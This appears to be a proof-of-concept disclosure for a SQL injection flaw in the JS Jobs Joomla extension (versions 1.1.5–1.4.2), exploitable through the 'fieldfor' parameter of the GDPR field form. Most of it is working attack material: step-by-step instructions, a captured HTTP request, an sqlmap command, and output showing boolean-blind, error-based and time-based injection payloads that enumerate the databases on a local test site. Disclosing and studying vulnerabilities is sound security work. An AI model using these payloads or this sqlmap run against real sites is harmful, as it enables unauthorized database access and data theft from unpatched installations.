# CVE-2025-22206: JS Jobs SQL injection vulnerability

**CVE Link:** https://www.cve.org/CVERecord?id=CVE-2025-22206

**JS Jobs:** https://joomsky.com/js-jobs-joomla

**Writeup:** https://decrypt.locker/obtaining-my-first-cve

## Introduction
A SQL injection vulnerability in the JS Jobs plugin versions 1.1.5-1.4.2 for Joomla allows authenticated attackers (administrator) to execute arbitrary SQL commands via the 'fieldfor' parameter in the GDPR Field feature.

## POC
To exploit this vulnerability, log in as the site administrator and go to 'Dashboard >> GDPR Fields >> + Add New Field >> Add Fields >> Field Title: test >> Field Text: test >> Save Fields'.

![Alt text](https://decrypt.locker/content/images/size/w1000/2025/02/3.png)

Then capture the Save Fields HTTP request with Burp Suite and save the request to a file (req.txt). Then run SQLMap through the file to exploit the SQLi vulnerability (see below).

**HTTP Request:**
```
POST /administrator/index.php HTTP/1.1
Host: localhost:8080
Content-Length: 364
Cache-Control: max-age=0
sec-ch-ua: "Not A(Brand";v="8", "Chromium";v="132"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "Linux"
Accept-Language: en-GB,en;q=0.9
Origin: http://localhost:8080
Content-Type: application/x-www-form-urlencoded
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: http://localhost:8080/administrator/index.php
Accept-Encoding: gzip, deflate, br
Cookie: osColorScheme=dark; atumSidebarState=open; jsst_collapse_admin_menu=1; a3030abf7606e950783a31b16179a889=1c61b4c6f83b5569f9484c6888412100; f06339f02055c32957cf8cda32f8587f=48b5f4615da4721440ffe8ec49d08347
Connection: keep-alive

check=89cb1c0cc02cf810832f5e4c6c7b7386&fieldtitle=test&termsandconditions_text=test&termsandconditions_linktype=0&termsandconditions_link=&id=&task=gdpr.savegdprfield&option=com_jsjobs&userfieldtype=termsandconditions&isuserfield=1&fieldfor=14&published=1&required=1&isvisitorpublished=1&ordering=&created=&submit_app=Save+Fields&89cb1c0cc02cf810832f5e4c6c7b7386=1
```

**Exploit:**
```
ubuntu@host:~/tools$ python3 sqlmap-dev/sqlmap.py -r ~/test/req.txt --batch --dbs

        ___
       __H__
 ___ ___[']_____ ___ ___  {1.9.1.2#dev}
|_ -| . [']     | .'| . |
|___|_  [']_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

---
Parameter: fieldfor (POST)
    Type: boolean-based blind
    Title: Boolean-based blind - Parameter replace (original value)
    Payload: check=891b79eeac944c244b6331618aa0dac0&fieldtitle=test&termsandconditions_text=test&termsandconditions_linktype=0&termsandconditions_link=&id=&task=gdpr.savegdprfield&option=com_jsjobs&userfieldtype=termsandconditions&isuserfield=1&fieldfor=(SELECT (CASE WHEN (7446=7446) THEN 14 ELSE (SELECT 6203 UNION SELECT 9943) END))&published=1&required=1&isvisitorpublished=1&ordering=&created=&submit_app=Save Fields&891b79eeac944c244b6331618aa0dac0=1

    Type: error-based
    Title: MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)
    Payload: check=891b79eeac944c244b6331618aa0dac0&fieldtitle=test&termsandconditions_text=test&termsandconditions_linktype=0&termsandconditions_link=&id=&task=gdpr.savegdprfield&option=com_jsjobs&userfieldtype=termsandconditions&isuserfield=1&fieldfor=14 AND GTID_SUBSET(CONCAT(0x71786a6271,(SELECT (ELT(6091=6091,1))),0x716a766b71),6091)&published=1&required=1&isvisitorpublished=1&ordering=&created=&submit_app=Save Fields&891b79eeac944c244b6331618aa0dac0=1

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: check=891b79eeac944c244b6331618aa0dac0&fieldtitle=test&termsandconditions_text=test&termsandconditions_linktype=0&termsandconditions_link=&id=&task=gdpr.savegdprfield&option=com_jsjobs&userfieldtype=termsandconditions&isuserfield=1&fieldfor=14 AND (SELECT 7659 FROM (SELECT(SLEEP(5)))kQDv)&published=1&required=1&isvisitorpublished=1&ordering=&created=&submit_app=Save Fields&891b79eeac944c244b6331618aa0dac0=1
---

available databases [3]:
[*] information_schema
[*] joomla_db
[*] performance_schema
```
